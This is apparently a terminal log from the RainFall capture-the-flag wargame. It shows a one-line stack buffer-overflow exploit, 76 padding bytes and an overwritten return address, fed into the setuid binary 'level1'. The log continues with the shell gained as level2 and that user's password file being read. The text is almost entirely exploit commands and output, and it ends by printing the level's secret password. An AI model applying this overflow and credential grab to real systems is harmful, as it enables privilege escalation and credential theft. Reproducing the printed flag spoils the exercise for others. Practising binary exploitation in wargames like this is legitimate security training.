level1@RainFall:~$ python -c "print('A' * 76 + '\x44\x84\x04\x08')" > /tmp/toto
level1@RainFall:~$ cat /tmp/toto - | ./level1 
Good... Wait what?
whoami
level2
cat /home/level2/.pass
cat: /home/level2/.pass: No such file or directory
pwd     
/home/user/level1
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

